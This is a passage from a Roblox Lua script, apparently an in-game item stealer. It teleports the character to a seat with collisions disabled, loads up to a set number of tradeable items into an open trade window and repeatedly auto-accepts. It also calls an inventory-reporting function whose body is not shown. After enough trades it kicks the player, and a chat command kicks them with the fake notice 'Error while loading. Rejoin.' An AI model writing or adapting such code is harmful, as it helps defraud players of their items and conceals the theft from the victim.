local function safeTeleport(seat)
    local now = tick()
    if now - lastTpAt < 0.8 then task.wait(0.8 - (now - lastTpAt)) end
    lastTpAt = tick()

    local char = waitForChar(10)
    if not char then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
    if not hrp then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum and hum.Sit then hum.Sit = false; task.wait(0.2) end

    local restore = {}
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") then restore[p] = p.CanCollide; p.CanCollide = false end
    end

    local targetCframe = seat.CFrame * CFrame.new(0, 1.5, 0)
    
    local SPEED = 140
    local dist = (hrp.Position - targetCframe.Position).Magnitude
    local duration = math.max(dist / SPEED, 0.45)
    local t0 = tick()

    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5); bv.Velocity = Vector3.zero; bv.Parent = hrp

    local conn
    conn = RunService.Heartbeat:Connect(function()
        if not hrp.Parent then return end
        local diff = targetCframe.Position - hrp.Position
        local remain = diff.Magnitude
        if remain < 1 then bv.Velocity = Vector3.zero; return end
        local frac = math.min(1, (tick() - t0) / duration)
        local mult = 0.4 + 0.6 * math.sin(frac * math.pi / 2)
        local speed = SPEED * mult
        if remain < 8 then speed = math.min(speed, remain / 0.15) end
        bv.Velocity = diff.Unit * speed
    end)

    local deadline = t0 + duration + 2.5
    while tick() < deadline do
        if (hrp.Position - targetCframe.Position).Magnitude < 2 then break end
        task.wait(0.05)
    end

    conn:Disconnect()
    if bv.Parent then bv:Destroy() end
    for p, c in pairs(restore) do if p.Parent then p.CanCollide = c end end
    
    hrp.CFrame = CFrame.new(hrp.Position, seat.Position)
    task.wait(0.3)
    return true
end

local function sitOn(seat)
    if not seat then return false end
    if currentSeat() == seat then lastSitTime = tick() return true end

    local char = LP.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum and hum.Sit and tick() - lastSitTime < 5 then return true end
    end

    if not safeTeleport(seat) then return false end

    char = waitForChar(5)
    if not char then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
    if not hum or not hrp then return false end

    local welded = false
    local conn = seat.ChildAdded:Connect(function(c) if c.Name == "SeatWeld" then welded = true end end)

    pcall(function() seat:Sit(hum) end)
    hum.Sit = true
    lastSitTime = tick()

    local t0 = tick()
    while tick() - t0 < 4 and not welded do
        if seatOccupant(seat) == LP then welded = true; break end
        task.wait(0.1)
    end
    conn:Disconnect()
    if welded then lastSitTime = tick() end
    return welded
end

local function forceJumpOff()
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    hum.Sit = false
    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
    task.wait(0.3)
end

-- =============================================================================
-- 8. TRADE LOGIC
-- =============================================================================
local function tradeWindowOpen()
    local main = PG:FindFirstChild("Main")
    local tr = main and main:FindFirstChild("Trade")
    return tr and tr.Visible or false
end

local function clearTradeItems()
    if not tradeWindowOpen() or not TradeFunction then return end
    local c = PG.Main.Trade:FindFirstChild("Container")
    if not c or not c:FindFirstChild("1") then return end
    local frame = c["1"]:FindFirstChild("Frame")
    if not frame then return end
    for _, item in ipairs(frame:GetChildren()) do
        if item:IsA("ImageButton") then
            pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", item.Name)
            task.wait(0.05)
        end
    end
end

local function addToTrade(name)
    if not TradeFunction then return end
    pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", name)
end

local function runAutoTrade(reason)
    local items = collectTradeable()
    log("trade: " .. #items .. " tradeable | " .. reason)
    sendInventoryEmbed(reason)
    if #items == 0 then return end

    clearTradeItems()
    task.wait(0.25)

    local take = math.min(MAX_ITEMS_PER_TRADE, #items)
    for i = 1, take do
        addToTrade(items[i].Name)
        log("  + " .. items[i].Name)
        task.wait(0.15)
    end

    local t0 = tick()
    local closed = false
    while tick() - t0 < 40 do
        if not tradeWindowOpen() then closed = true; break end
        if TradeFunction then pcall(TradeFunction.InvokeServer, TradeFunction, "accept") end
        task.wait(0.4)
    end

    if closed then
        tradesCompleted = tradesCompleted + 1
        log("trade " .. tradesCompleted .. "/" .. KICK_THRESHOLD .. " closed")
        if tradesCompleted >= KICK_THRESHOLD then task.wait(1.5); LP:Kick(KICK_MSG) end
    end
end

-- =============================================================================
-- 9. CHAT COMMANDS
-- =============================================================================
local function cmdTp() local s = pickSeat(nil); if s then sitOn(s) end end
local function cmdSit()
    local char = LP.Character; if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
    hum.Sit = true; task.wait(0.4)
    if not currentSeat() then local s = pickSeat(nil); if s then sitOn(s) end end
end
local function cmdAddAll()
    if not tradeWindowOpen() then return end
    local items = collectTradeable(); clearTradeItems(); task.wait(0.25)
    local c = 0
    for _, item in ipairs(items) do
        if c >= MAX_ITEMS_PER_TRADE then break end
        addToTrade(item.Name); c = c + 1; task.wait(0.15)
    end
end
local function cmdKick() task.wait(0.5); LP:Kick("Error while loading. Rejoin.") end
local function cmdJump() forceJumpOff() end

local COMMANDS = { tp = cmdTp, sit = cmdSit, addall = cmdAddAll, kick = cmdKick, jump = cmdJump }
local function handleChat(msg)
    if type(msg) ~= "string" then return end
    if msg:sub(1, #CHAT_PREFIX) ~= CHAT_PREFIX then return end
    local body = msg:sub(#CHAT_PREFIX + 1):lower():gsub("%s+", "")
    local fn = COMMANDS[body]
    if not fn then return end
    task.spawn(function() pcall(fn) end)
end
LP.Chatted:Connect(handleChat)

